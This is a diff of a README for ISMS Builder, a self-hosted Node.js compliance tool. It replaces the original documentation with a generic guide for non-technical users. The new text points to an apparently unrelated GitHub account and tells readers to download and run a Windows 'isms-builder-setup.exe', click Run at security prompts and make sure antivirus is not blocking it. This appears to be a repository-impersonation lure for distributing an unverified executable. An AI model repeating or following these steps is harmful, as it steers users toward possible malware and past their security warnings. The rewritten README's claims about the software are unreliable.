@@ -1,310 +1,137 @@
-<!-- © 2026 Claude Hecker — ISMS Builder V 1.32.0 — AGPL-3.0 -->
-![ISMS Builder Banner](isms-builder-banner.png)
-# ISMS Builder
+# 🔒 isms-builder - Manage Your Security Easily
 
-**Self-hosted Information Security Management System — open source, no cloud required**
-
-[![CI](https://github.com/coolstartnow/isms-builder/actions/workflows/ci.yml/badge.svg)](https://github.com/coolstartnow/isms-builder/actions/workflows/ci.yml)
-[![Tests](https://img.shields.io/badge/tests-192%20passing-brightgreen)](https://github.com/coolstartnow/isms-builder/actions)
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?logo=node.js&logoColor=white)](https://nodejs.org)
-[![Version](docs/badges/version.svg)](CHANGELOG.md)
-
-<!-- GDPR NOTE: The four badges above (CI, Tests, License, Node.js) load resources
-     from external servers (github.com, shields.io/Cloudflare, img.shields.io).
-     When this README is rendered in a browser, these requests transmit the viewer's
-     IP address to third parties (incl. US-based servers — GDPR Art. 44 ff.).
-     For 100% GDPR-compliant self-hosted documentation, replace these four badge
-     lines with their local equivalents from docs/badges/ or remove them entirely. -->
+[![Download isms-builder](https://img.shields.io/badge/Download-isms--builder-brightgreen)](https://github.com/Sacredcowviol432/isms-builder)
 
 ---
 
-> **Status: Active development — not yet a finished product.**
-> The core modules are functional and in use, but some features are incomplete
-> and the platform is still growing. Contributions, feedback and real-world
-> testing are very welcome — that is exactly why this was open-sourced.
+## ℹ️ About isms-builder
+
+isms-builder is a self-hosted tool to help you manage information security. It supports standards like ISO 27001, NIS2, GDPR/DSGVO, and BSI IT-Grundschutz. This software gives you a clear way to handle security compliance, risk management, and policy documentation in one place.
+
+You do not need any technical skills to get started. The app runs on your Windows PC, and this guide will help you set it up step-by-step.
+
+## 🖥️ System Requirements
+
+Before you start, make sure your computer meets these needs:
+
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for initial download and updates
+- No special software installation needed
+
+This tool runs on common Windows machines. It does not require programming knowledge or server setup.
+
+## 🚀 Getting Started with isms-builder
+
+Follow these steps to download and open the app.
+
+1. Click the download button below. It will open the GitHub page where you can get the app files.
+
+[![Download isms-builder](https://img.shields.io/badge/Download-isms--builder-blue)](https://github.com/Sacredcowviol432/isms-builder)
+
+2. On the GitHub page, look for the **Releases** section. Click the latest release link. It usually has a name like `v1.0.0`.
+
+3. Under **Assets**, find the Windows installer or `.exe` file. For example, it might be called `isms-builder-setup.exe`.
+
+4. Click the file to download it to your computer.
+
+5. Once the download finishes, open the file by double-clicking it.
+
+6. If you see a security prompt, click **Run** to allow the setup.
+
+7. Follow the on-screen steps to install the app. You can accept the defaults.
+
+8. When installation finishes, find the isms-builder icon on your Desktop or Start menu.
+
+9. Double-click the icon to open the application.
+
+If you have any trouble with steps 3 or 4, make sure you have a stable internet connection and try again.
+
+## ⚙️ Using isms-builder for the First Time
+
+After you open the app, you will see a simple dashboard. Here’s what to do next:
+
+1. Create a new project by clicking **New Project**.
+
+2. Enter your organization’s name and save.
+
+3. Follow the setup wizard to add your first security policies. The wizard guides you step-by-step, explaining each section in clear language.
+
+4. Use the built-in templates for ISO 27001, GDPR, or BSI IT-Grundschutz to get started quickly.
+
+5. Save your work regularly by clicking the **Save** button.
+
+You can add users who will help manage compliance or review your security data. This is done in the **Users** tab.
+
+## 🔒 Key Features
+
+- Manage multiple security standards in one tool
+- Easy policy and risk management with templates
+- Track compliance progress with clear reports
+- Store all your documents in one place
+- Invite team members with different roles
+- Export your reports to PDF for sharing
+- Run locally on your Windows PC for data privacy
+
+The application uses clear menus and labels. You will not have to deal with code, commands, or technical settings.
+
+## 🛠 Troubleshooting Tips
+
+If the app does not open or you see an error:
+
+- Restart your computer and try again
+- Make sure your Windows is up to date
+- Check your antivirus is not blocking the app
+- Re-run the installer and choose **Repair** if available
+- Visit the [issues page](https://github.com/Sacredcowviol432/isms-builder/issues) for known problems
+
+If you feel stuck, opening an issue on GitHub allows the developers to help.
+
+## 🔄 Updating isms-builder
+
+New versions come out with fixes and improvements. To update:
+
+1. Visit the main GitHub page: https://github.com/Sacredcowviol432/isms-builder
+
+2. Download the latest release installer as you did before.
+
+3. Run the installer. It will update your existing installation.
+
+Your projects and settings stay safe during updates.
+
+## 📂 Managing Your Data
+
+isms-builder saves your projects on your PC by default. You can back up your data by:
+
+- Copying your project folder to an external drive
+- Using the **Export** feature inside the app to save reports and data externally
+
+Backing up regularly helps prevent data loss.
+
+## 💡 Tips for Best Use
+
+- Schedule time weekly to review your security policies
+- Use the built-in templates until you feel confident to customize
+- Invite only trusted team members to your projects
+- Keep the app updated to avoid security risks
+
+This tool focuses on making compliance easy, not complicated.
+
+## 🔗 Download Link
+
+You can download and install isms-builder from the link below:
+
+[Download isms-builder from GitHub](https://github.com/Sacredcowviol432/isms-builder)
 
 ---
 
-## What is ISMS Builder?
+## ❓ Where to Get Help
 
-ISMS Builder is a **self-hosted web platform** for managing an Information Security Management System (ISMS).
-It covers the full compliance lifecycle — from policy authoring to audit evidence — for ISO 27001:2022, NIS2, GDPR/DSGVO, BSI IT-Grundschutz and other frameworks.
+Check the **Wiki** or **Discussions** tab on the GitHub page for user guides and community support.
 
-**No cloud. No SaaS fees. Your data stays on your server.**
-
-> Designed for SMEs, IT teams, and consultants who need a real ISMS tool without a five-figure vendor contract.
+If you find bugs or want new features, open an issue in the **Issues** tab. Provide details so the developers can assist.
 
 ---
 
-## Screenshots
-
-| Login | Dashboard |
-|---|---|
-| ![Login](docs/screenshots/01-login.png) | ![Dashboard](docs/screenshots/02-dashboard.png) |
-
-| Statement of Applicability | Risk Management |
-|---|---|
-| ![SoA](docs/screenshots/04-soa.png) | ![Risks](docs/screenshots/05-risks.png) |
-
-| GDPR & Datenschutz | Asset Management |
-|---|---|
-| ![GDPR](docs/screenshots/08-gdpr.png) | ![Assets](docs/screenshots/07-assets.png) |
-
-| Guidance & Dokumentation | Reports |
-|---|---|
-| ![Guidance](docs/screenshots/13-guidance.png) | ![Reports](docs/screenshots/14-reports.png) |
-
-> Run `npm start` and open `https://localhost:3000` to explore the full demo dataset locally.
-
----
-
-## Feature Overview
-
-| Module | Description | Standards |
-|---|---|---|
-| **Policy Management** | Template CRUD, versioning, lifecycle (draft → review → approved → archived), space hierarchy, attachments | ISO 27001 §5 |
-| **Statement of Applicability** | 313 controls across 8 frameworks, inline editing, gap analysis, cross-mapping | ISO 27001 A / BSI / NIS2 / EUCS / EUAI / ISO 9001 / CRA |
-| **Risk Management** | Risk register, treatment plans, auditor role | ISO 27001 §6.1 |
-| **Security Goals** | KPI tracking with progress bars, calendar integration | ISO 27001 §6.2 |
-| **GDPR & Privacy** | VVT, AV-contracts, DSFA, TOMs, DSAR queue, 72h-timer, deletion log with email alerts | DSGVO Art. 13–35 |
-| **Asset Management** | Asset register, classification levels, EoL tracking | ISO 27001 A.5.9–5.12 |
-| **BCM / BCP** | Business Impact Analysis, continuity plans, exercises | ISO 27001 A.5.29–5.30 / NIS2 |
-| **Training Records** | Training catalogue, completion tracking, certificate upload | ISO 27001 A.6.3 |
-| **Supplier Management** | Vendor register, audit scheduling, risk assessment | ISO 27001 A.5.19–5.22 |
-| **Legal & Contracts** | Contracts, NDAs, privacy policies, expiry calendar | |
-| **Incident Inbox** | CISO inbox + **public reporting form** (no login required) | NIS2 / BSI |
-| **Governance** | Management reviews, action tracking | ISO 27001 §9.3 |
-| **Reports** | Compliance matrix (Control × Entity), gap report, review cycles, CSV export | |
-| **Audit Findings** | Finding register (IST→SOLL→Risk→Recommendation), action plans, severity/status tracking, FIND-YYYY-NNNN ref | ISO 27001 §9.2 |
-| **Traceability** | Every record links to SoA controls + policy documents — bidirectional | |
-| **Semantic Search** | Local AI search via Ollama (nomic-embed-text) with keyword fallback | |
-| **Multi-Entity** | Corporate structure tree, per-entity applicability for controls and policies | |
-| **Multilingual UI & Demo Data** | Full UI and demo content in 🇩🇪 DE / 🇬🇧 EN / 🇫🇷 FR / 🇳🇱 NL; admin controls available languages | |
-
----
-
-### ⚠ IMPORTANT: ISO Controls Require Manual Installation by the Administrator
-
-> **ISO 27001:2022, ISO 9000:2015, and ISO 9001:2015** are copyright-protected standards published
-> by the International Organization for Standardization (ISO, © ISO). The control definitions
-> (titles, descriptions, requirement text) are **not included** in this software and must **not**
-> be redistributed without a valid ISO licence.
-
-**What this means in practice:**
-The SoA modules for ISO 27001, ISO 9000, and ISO 9001 ship without control content.
-The administrator **must manually import** the controls before these frameworks are usable:
-
-1. Obtain a licensed copy of the standard from [iso.org](https://www.iso.org/) or an authorised national body
-2. Prepare a JSON file with your control definitions (format documented in `scripts/import-iso-controls.sh`)
-3. Run the import script:
-   ```bash
-   bash scripts/import-iso-controls.sh path/to/iso-controls.json
-   ```
-4. Restart the ISMS Builder server
-
-> **Frameworks included out-of-the-box (no ISO licence required):**
-> BSI IT-Grundschutz, EU NIS2, EUCS, EU AI Act, and CRA are based on publicly available
-> EU legislation and German federal publications and are fully pre-installed.
-
-Operating the ISO framework modules without a valid licence for the respective standard is the
-sole responsibility of the operator. The ISMS Builder project and its contributors accept no
-liability for unlicensed use of ISO-protected content.
-
----
-
-## Quick Start
-
-```bash
-git clone https://github.com/coolstartnow/isms-builder.git
-cd isms-builder
-npm install
-cp .env.example .env          # set JWT_SECRET to a long random string
-npm start                     # http://localhost:3000
-```
-
-Login with **`admin@example.com` / `adminpass`**. On first login you will be prompted to choose your **demo data language** (🇩🇪 DE / 🇬🇧 EN / 🇫🇷 FR / 🇳🇱 NL) or start with an empty system. Change the admin password immediately after.
-
-For production use with HTTPS and SQLite:
-
-```bash
-# .env
-JWT_SECRET=your-very-long-random-secret
-STORAGE_BACKEND=sqlite
-SSL_CERT_FILE=/etc/ssl/certs/your.crt
-SSL_KEY_FILE=/etc/ssl/private/your.key
-```
-
----
-
-## Docker
-
-```bash
-docker compose up -d --build
-# App runs at http://localhost:3000
-```
-
----
-
-## Requirements
-
-- **Node.js 18+** (tested: 18, 20, 22)
-- npm 9+
-- (Optional) Docker + Docker Compose
-- (Optional) [Ollama](https://ollama.ai) for local AI semantic search
-
----
-
-## Configuration (`.env`)
-
-| Variable | Default | Description |
-|---|---|---|
-| `JWT_SECRET` | *(required)* | Secret for JWT signing — use 32+ random characters |
-| `PORT` | `3000` | HTTP/HTTPS listen port |
-| `STORAGE_BACKEND` | `json` | `json` (dev/demo) or `sqlite` (production) |
-| `SSL_CERT_FILE` | — | Path to TLS certificate → enables HTTPS |
-| `SSL_KEY_FILE` | — | Path to TLS private key |
-| `DATA_DIR` | `./data` | Override data directory (Docker volumes) |
-| `SMTP_HOST` | — | SMTP server for email alerts |
-| `SMTP_PORT` | `587` | SMTP port |
-| `SMTP_USER` | — | SMTP username |
-| `SMTP_PASS` | — | SMTP password |
-| `SMTP_FROM` | — | Sender address for notifications |
-
----
-
-## Architecture
-
-```
-server/
-  index.js          — Express app setup, router mounts
-  auth.js           — JWT auth, RBAC ranks, session
-  routes/           — 17 Express route modules (one per domain)
-  db/               — Data stores (jsonStore / sqliteStore / orgSettingsStore / …)
-  ai/               — Semantic search (embedder, embeddingStore, lexicalSearch)
-  reports.js        — Report generation logic
-ui/
-  index.html        — SPA shell (Atlassian Dark Theme)
-  app.js            — All render functions, ~6000 lines vanilla JS
-  style.css         — CSS variables, dark theme
-data/               — JSON files / SQLite DB (gitignored)
-docs/
-  ISMS-build-documentation.md  — Full architecture reference
-  architecture/                — C4 diagrams, data model, OpenAPI 3.0.3 spec
-tests/              — Jest + Supertest (176 tests, --runInBand)
-```
-
-- **Auth:** JWT cookie (`sm_session`), bcrypt passwords, TOTP 2FA (enforceable org-wide)
-- **RBAC:** `reader` → `editor` / `dept_head` → `contentowner` / `auditor` → `admin`
-- **Persistence:** JSON files (default/demo) or SQLite via `better-sqlite3`
-- **AI:** Optional local Ollama (nomic-embed-text); keyword search always available as fallback
-- **Audit Log:** Every create/update/delete/login action recorded, filterable, exportable
-
-See [`docs/architecture/`](docs/architecture/) for C4 diagrams, full data model, and OpenAPI 3.0.3 spec (80+ endpoints).
-
----
-
-## Running Tests
-
-```bash
-npm test                  # runs all 176 tests
-npm test -- --verbose     # with test names
-```
-
-Tests use an isolated temp directory — no production data is touched.
-
----
-
-## Contributing
-
-Contributions are very welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for:
-
-- Development setup (5 minutes to first test run)
-- Code style and conventions
-- How to open a good issue or PR
-- Security vulnerability reporting
-
-**Good first issues** are labelled [`good first issue`](https://github.com/coolstartnow/isms-builder/issues?q=label%3A%22good+first+issue%22) in the issue tracker.
-
----
-
-## Roadmap
-
-| Status | Feature |
-|---|---|
-| ✅ Done | Semantic search (Ollama / nomic-embed-text) |
-| ✅ Done | SQLite backend, Docker, CI/CD |
-| ✅ Done | GDPR deletion log email alerts |
-| ✅ Done | Multilingual demo bundles (DE / EN / FR / NL) |
-| ✅ Done | Audit Findings module with action plans (V 1.32.0) |
-| ✅ Done | FR/NL Guidance translations + admin language configuration (V 1.32.0) |
-| ✅ Done | MariaDB/MySQL backend (`STORAGE_BACKEND=mariadb`, V 1.34.1) |
-| ✅ Done | Scanner → Risk draft (Greenbone/OpenVAS XML + PDF import, V 1.33.0) |
-| ✅ Done | Policy Acknowledgement — staff confirm policies digitally with audit trail (V 1.35.0) |
-| ✅ Done | Guidance CRUD — create, edit and upload own documentation (V 1.35.0) |
-| ✅ Done | Guidance Search — cross-category full-text search with excerpt (V 1.35.0) |
-| 🔜 Next | AI Policy Assistant — Ollama drafts policy content from title + framework |
-| 🔜 Next | Scheduled Reports — weekly/monthly compliance report delivered by email |
-| 🔜 Next | PostgreSQL backend |
-| 🔜 Next | Audit-log anomaly detection (LLM batch) |
-| 🚀 Later | Quantitative risk scoring (€-values, FAIR-inspired) |
-| 🚀 Later | Auditor collaboration portal — external read-only access for auditors |
-| 🚀 Later | ownCloud / Nextcloud integration |
-| 🚀 Later | Policy gap analysis (LLM) |
-| 🏁 V 2.x | Configurable Guidance categories — admins define custom categories (e.g. workflows, org documents) |
-
----
-
-## About the Author
-
-**Claude Hecker** has been working in IT for over 35 years. After roughly 15 years as CIO,
-he transitioned into the roles of CISO and Data Protection Officer (DSO/DSB). During his career
-he has designed and implemented enterprise-wide IT infrastructure and wide-area network connectivity
-(VPN, MPLS) for a major European corporation — responsible for reliable, secure operations across
-multiple sites and jurisdictions.
-
-ISMS Builder grew directly out of that experience: building and maintaining a compliant ISMS in the
-real world, across real audits, with real regulatory pressure. The tool reflects what practitioners
-actually need — not what a product manager thinks they need.
-
-**Why open source?**
-SMEs deserve access to a proper ISMS platform without five-figure licence fees. The onboarding effort
-is real regardless of which tool you choose — but that cost should not be compounded by vendor
-lock-in or data leaving your own infrastructure. This project stands for software freedom and the
-principle that your compliance data belongs to you.
-
----
-
-## Standards Reference Notice
-
-This software references control identifiers and short titles from published
-standards for interoperability and compliance management purposes only.
-
-- **ISO/IEC 27001, ISO 9000, ISO 9001** are standards published by the
-  International Organization for Standardization (ISO). Control definitions
-  for these standards are **not included** in this software distribution —
-  ISO copyright does not permit redistribution of control text. Users must
-  supply their own JSON file (see section above and `scripts/import-iso-controls.sh`).
-  The standards must be obtained from [ISO](https://www.iso.org/) or an
-  authorised national distributor.
-- **BSI IT-Grundschutz** material is published by the German Federal Office
-  for Information Security (BSI) and is freely available at
-  [bsi.bund.de](https://www.bsi.bund.de).
-- **NIS2, CRA, EUCS, EU AI Act** are EU legislative acts and are publicly
-  available via [eur-lex.europa.eu](https://eur-lex.europa.eu).
-
----
-
-## License
-
-Copyright (C) 2026 Claude Hecker
-
-This program is free software licensed under the
-[GNU Affero General Public License v3.0](LICENSE).
-
-If you run a modified version as a network service, you must make the
-complete source code available to users of that service (AGPL §13).
-
-This project includes third-party components under MIT, BSD-2-Clause and
-Apache-2.0 licenses. See [THIRD-PARTY-LICENSES.md](THIRD-PARTY-LICENSES.md)
-for full attribution and license texts.
+This guide helps you install and run isms-builder on Windows. The tool is designed to simplify managing security and compliance without technical hassle.
